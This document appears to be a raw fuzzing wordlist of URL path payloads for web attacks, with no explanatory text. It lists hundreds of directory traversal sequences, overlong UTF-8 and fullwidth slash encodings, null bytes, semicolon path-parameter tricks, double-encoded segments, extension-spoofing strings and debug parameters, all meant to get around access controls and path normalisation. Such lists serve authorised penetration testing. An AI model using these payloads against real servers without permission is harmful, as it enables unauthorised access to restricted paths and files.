#
#/
#/../
#/./
#?
%
%00
%09
%09%3b
%09..
%09../
%09..;
%09..;/
%09/
%09;
%09;/
%0A
%0D
%20
%20/
%20;
%23
%23%3f
%252f
%252f%252f
%252f/
%26
%2e
%2e%2e
%2e%2e%2f
%2e%2e%5c
%2e%2e/
%2e%2e/%2e%2e/
%2e%2e;
%2e%2f
%2e%2f%2f
%2e%80%
%2e.php%3b.jpg
%2e/
%2e//
%2e;
%2e;%2f
%2e;%2f%2f
%2e;/
%2e;//
%2f
%2f%20%23
%2f%23
%2f%2f
%2f%2f%2f
%2f%3b%2f
%2f%3b%2f%2f
%2f%3f
%2f%3f/
%2f/
%2f/%2f
%2f//
%2f;?
%2f?;
%3F.jpg/
%3b
%3b%09
%3b%2f%2e%2e
%3b%2f%2e%2e%2f%2e%2e%2f%2f
%3b%2f%2e.
%3b%2f..
%3b/%2e%2e/..%2f%2f
%3b/%2e.
%3b/%2f%2f../
%3b/..
%3b//%2f../
%3f
%3f%23
%3f%3f
%3f.php
%5c
%61
%C0%AF
%c0%ae%c0%ae
%c0%af
%c0%af%c0%af
%c0%af%c0%af%c0%af
%c0%af%c0%af..
%c0%af.
%c0%af.%c0%af
%c0%af.%c0%af%c0%af
%c0%af.;
%c0%af.;%c0%af
%c0%af.;%c0%af%c0%af
%c0%af;%c0%af
%c0%af;%c0%af%c0%af
%c0%af;x/..
%c0%afx%c0%af..
%c0%afx%c0%af..;
%c0%afx;%c0%af..
%c0%afx;%c0%af..;
%ef%bc%8f
%ef%bc%8f%ef%bc%8f
%ef%bc%8f%ef%bc%8f%ef%bc%8f
%ef%bc%8f%ef%bc%8f..
%ef%bc%8f.
%ef%bc%8f.%ef%bc%8f
%ef%bc%8f.%ef%bc%8f%ef%bc%8f
%ef%bc%8f.;
%ef%bc%8f.;%ef%bc%8f
%ef%bc%8f.;%ef%bc%8f%ef%bc%8f
%ef%bc%8f;%ef%bc%8f
%ef%bc%8f;x/..
%ef%bc%8fx%ef%bc%8f..
%ef%bc%8fx%ef%bc%8f..;
%ef%bc%8fx;%ef%bc%8f..
%ef%bc%8fx;%ef%bc%8f..;
%u002e
%u002e/%u002e
%u002e;
&
-
.
.%00
.%00/
.%2e/
..
..%00/
..%00/;
..%00;/
..%09
..%0d/
..%0d/;
..%0d;/
..%2f
..%3B
..%5c
..%5c/
..%ff
..%ff/
..%ff/;
..%ff;/
../
.././
..;
..;%00/
..;%0d/
..;%ff/
..;/
..;/..;/
..;\
..;\;
..;\\
..\
..\;
..\\
./
./.
.//
.//./
.;
.;/
.css
.html
.js
.json
.random
.svc
.svc?wsdl
.wsdl
/
/#
/%20
/%20#
/%20%20/
/%20%23
/%23
/%252e%252e%252f/
/%252e%252e%253b/
/%252e%252f/
/%252e%253b/
/%252e/
/%252f
/%2e%2e
/%2e%2e%2f
/%2e%2e%2f/
/%2e%2e%3b/
/%2e%2e/
/%2e%2f/
/%2e%3b/
/%2e%3b//
/%2e/
/%2e//
/%2f
/%2f/
/%3b/
/%u002e/%u002e
/%u002e/%u002e;
/%u002e;
/*
/*/
/.
/.%00
/.%00/
/..
/..%2f
/..%2f..%2f
/..%2f..%2f..%2f
/..%3B%2F..%3B%2F
/../
/../../
/../../../
/../../..//
/../..//
/../..//../
/../..;/
/.././../
/../.;/../
/..//
/..//../
/..//../../
/..//..;/
/../;/
/../;/../
/..;
/..;%2f
/..;%2f..;%2f
/..;%2f..;%2f..;%2f
/..;/
/..;/../
/..;/..;/
/..;//
/..;//../
/..;//..;/
/..;/;/
/..;/;/..;/
/./
/.//
/.;
/.;/
/.;//
/.randomstring
//
//%2f
//.
//..
//../
//../../
//..;
//./
//.;/
///
///..
///../
///..//
///..;
///..;/
///..;//
////
/////
///;
///;/
//;
//;/
//?anything
/;
/;/
/;/../
/;/../%2f/
/;/../../
/;/../..//
/;/.././../
/;/../.;/../
/;/..//
/;/..//%2e%2e/
/;/..//%2f
/;/..//../
/;/..///
/;/../;/
/;/../;/../
/;//
/;///
/;?
/;x
/;x/
/;x;
/?
/?.css
/?.js
/?;
/_
/a=?.css
/a=?.js
/x/../
/x/..//
/x/../;/
/x/..;/
/x/..;//
/x/..;/;/
/x//../
/x//..;/
/x/;/../
/x/;/..;/
/x;/%2e%2e
/x;/%2e%2e/
/x;/..
/x;/../
0
1
;
;%09
;%09..
;%09..;
;%09;
;%2F..
;%2f%2e%2e
;%2f%2e%2e%2f%2e%2e%2f%2f
;%2f%2f/../
;%2f..
;%2f..%2f%2e%2e%2f%2f
;%2f..%2f..%2f%2f
;%2f..%2f..%2f
;%2f..%2f/
;%2f..%2f/..%2f
;%2f..%2f/../
;%2f../%2f..%2f
;%2f../%2f../
;%2f..//..%2f
;%2f..//../
;%2f..///
;%2f..///;
;%2f..//;/
;%2f..//;/;
;%2f../;//
;%2f../;/;/
;%2f../;/;/;
;%2f..;///
;%2f..;//;/
;%2f..;/;//
;%2f/%2f../
;%2f//..%2f
;%2f//../
;%2f//..;/
;%2f/;/../
;%2f/;/..;/
;%2f;//../
;%2f;/;/..;/
;/
;/$2e%2e%2f..%2f
;/%2e%2e
;/%2e%2e%2f%2e%2e%2f
;/%2e%2e%2f%2f
;/%2e%2e%2f/
;/%2e%2e/
;/%2e.
;/%2f%2f../
;/%2f/..%2f
;/%2f/../
;/.%2e
;/.%2e/%2e%2e/%2f
;/..
;/..%2f
;/..%2f%2e%2e%2f
;/..%2f%2f../
;/..%2f..%2f
;/..%2f/
;/..%2f//
;/../
;/../%2f/
;/../../
;/../..//
;/.././../
;/../.;/../
;/..//
;/..//%2e%2e/
;/..//%2f
;/..//../
;/..///
;/../;/
;/../;/../
;/../index
;/..;
;/.;.
;//
;//%2f../
;//..
;//../../
;///..
;///../
;///..//
;?
;x
;x/
;x;
?
?#
?.css
?.js
?.php
?;
??
???
?WSDL
?debug=1
?debug=true
?param
\..\.\
\..\.\..\
\..\.\..\.\..\.\..\.\..\.\..\.\
\/\/
_
api/v4;X=Y/
debug
false
index/%2e%2e
index/../
index/;
null
true
x;/%2e%2e
x;/%2e%2e/
x;/..
x;/../
~
~/
°
°/
